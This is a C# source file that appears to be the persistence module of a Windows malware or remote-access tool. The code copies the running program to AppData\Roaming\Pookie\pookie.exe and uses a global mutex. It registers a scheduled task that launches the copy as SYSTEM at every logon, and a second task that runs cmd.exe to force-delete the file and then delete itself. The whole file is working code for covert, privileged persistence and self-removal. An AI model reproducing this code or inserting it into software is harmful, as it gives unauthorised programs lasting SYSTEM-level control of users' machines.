using Microsoft.Win32.TaskScheduler;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace zort
{
    public static class PookieHelper
    {
        public static bool AmIPookie()
        {
            string pookiePath = GetPookiePath();
            string currentPath = Assembly.GetExecutingAssembly().Location;
            return string.Equals(Path.GetFullPath(pookiePath), Path.GetFullPath(currentPath), StringComparison.OrdinalIgnoreCase);
        }

        public static bool IsPookieRunning()
        {
            return Process.GetProcessesByName("pookie").Length > 0;
        }

        public static bool PookieExists()
        {
            return File.Exists(GetPookiePath());
        }

        public static string GetPookiePath()
        {
            string AppdataRoaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string AppdataRoamingPookie = Path.Combine(AppdataRoaming, "Pookie");
            string clonePath = Path.Combine(AppdataRoamingPookie, "pookie.exe");

            return clonePath;
        }

        public static void CreatePookie()
        {
            var pookiePath = GetPookiePath();
            if (!Directory.Exists(Path.GetDirectoryName(pookiePath)))
            {
                Directory.CreateDirectory(Path.GetDirectoryName(pookiePath));
            }

            PersistenceHelper.Clone.Create(pookiePath);
        }

        public static class PookieMutex
        {
            public static bool Exists()
            {
                string mutexName = "Global\\PookieMutex";
                bool createdNew;
                using (var mutex = new System.Threading.Mutex(true, mutexName, out createdNew))
                {
                    if (createdNew)
                    {
                        return false; // Mutex was created, so it doesn't exist
                    }
                    else
                    {
                        return true; // Mutex already exists
                    }
                }
            }

            public static void Release()
            {
                string mutexName = "Global\\PookieMutex";
                using (var mutex = new System.Threading.Mutex(true, mutexName))
                {
                    if (mutex.WaitOne(0))
                    {
                        mutex.ReleaseMutex();
                    }
                }
            }
        }

        public static class Tasks
        {
            public static Microsoft.Win32.TaskScheduler.Task Get(string taskName)
            {
                using (var taskService = new TaskService())
                {
                    return taskService.FindTask(taskName);
                }
            }

            public static bool Exists(string taskName)
            {
                return Get(taskName) != null;
            }

            public static void Remove(string taskName)
            {
                if (!Exists(taskName)) throw new InvalidOperationException("Task does not exist.");
                using (var taskService = new TaskService())
                {
                    var task = taskService.FindTask(taskName);
                    if (task != null)
                    {
                        taskService.RootFolder.DeleteTask(taskName);
                    }
                }
            }

            public static class StartAtLogon 
            {
                public const string TASK_NAME = "PookieBearUwU";

                public static bool Exists()
                {
                    return Tasks.Exists(TASK_NAME);
                }

                public static void Create()
                {
                    if (Exists()) throw new InvalidOperationException("Task already exists.");
                    if(!PookieExists()) throw new InvalidOperationException("Pookie does not exist.");

                    string pookiePath = GetPookiePath();
                    using (var taskService = new TaskService())
                    {
                        var taskDefinition = taskService.NewTask();
                        taskDefinition.RegistrationInfo.Description = "ily pookie uwu";
                        taskDefinition.Principal.UserId = "SYSTEM";
                        taskDefinition.Principal.LogonType = TaskLogonType.ServiceAccount;
                        taskDefinition.Triggers.Add(new LogonTrigger());
                        taskDefinition.Actions.Add(new ExecAction(pookiePath, null, null));
                        taskService.RootFolder.RegisterTaskDefinition(TASK_NAME, taskDefinition);
                    }
                }

                public static void Remove()
                {
                    Tasks.Remove(TASK_NAME);
                }
            }

            public static class DeleteAtNextLogon
            {
                public const string TASK_NAME = "ByePookieTwT";
                public static bool Exists()
                {
                    return Tasks.Exists(TASK_NAME);
                }
                public static void Create()
                {
                    if (Exists()) throw new InvalidOperationException("Task already exists.");
                    if (!PookieExists()) throw new InvalidOperationException("Pookie does not exist.");

                    string pookiePath = GetPookiePath();
                    using (var taskService = new TaskService())
                    {
                        var taskDefinition = taskService.NewTask();
                        taskDefinition.RegistrationInfo.Description = "Delete Pookie at next logon and remove task";
                        taskDefinition.Principal.UserId = "SYSTEM";
                        taskDefinition.Principal.LogonType = TaskLogonType.ServiceAccount;
                        taskDefinition.Triggers.Add(new LogonTrigger());
                        taskDefinition.Actions.Add(new ExecAction("cmd.exe", $"/c del /f /q \"{pookiePath}\" && schtasks /delete /tn \"{TASK_NAME}\" /f", null));
                        taskService.RootFolder.RegisterTaskDefinition(TASK_NAME, taskDefinition);
                    }
                }
                public static void Remove()
                {
                    Tasks.Remove(TASK_NAME);
                }
            }
        }
    }
}
